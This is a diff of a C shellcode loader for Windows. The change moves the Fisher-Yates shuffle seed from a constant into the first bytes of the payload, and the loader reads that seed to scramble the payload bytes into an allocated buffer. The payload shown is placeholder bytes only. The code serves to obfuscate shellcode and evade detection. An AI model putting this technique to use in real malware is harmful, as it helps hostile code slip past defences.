@@ -21,8 +21,6 @@ Note:
 #include <stdint.h>
 #include <stdlib.h>
 
-#define SEED 0x1337
-
 // Fisher-Yates shuffle
 void permutation (uint32_t index[], uint32_t size, uint32_t seed)
 {
@@ -54,25 +52,29 @@ int main ()
     DWORD   old_protect = 0;
 
     // shellcode storage in stack
-    uint8_t     payload []  = { 0x90, 0xc3, 0x90, 0xcc };
-    uint32_t    payload_len = 4;
+    uint8_t     payload []  = { 0x37, 0x13, 0x00, 0x00, 0x90, 0xc3, 0x90, 0xcc, };
+    uint32_t    payload_len = 8;
     uint8_t  *  ptr_runtime;
     uint8_t  *  ptr_payload;
 
     uint32_t *  indexes;
     uint32_t    idx;
+    uint32_t    seed;
 
     // allocate memory buffer for payload as READ-WRITE (no executable)
+    payload_len -= sizeof(seed);
     runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // generate array of index
     indexes = (uint32_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len * sizeof(uint32_t));
     for (idx = 0; idx < payload_len; idx++) indexes[idx] = idx;
 
-    permutation(indexes, payload_len, SEED);
+    // get the seed and do permutation
+    seed = *(uint32_t*)payload;
+    permutation(indexes, payload_len, seed);
 
-    // copy to allocated buffer
-    ptr_payload = (uint8_t*)payload;
+    // copy to allocated buffer (skipping the seed at front)
+    ptr_payload = (uint8_t*)payload + sizeof(seed);
     ptr_runtime = (uint8_t*)runtime;
     for (idx = 0; idx < payload_len; idx++) ptr_runtime[indexes[idx]] = ptr_payload[idx];
 
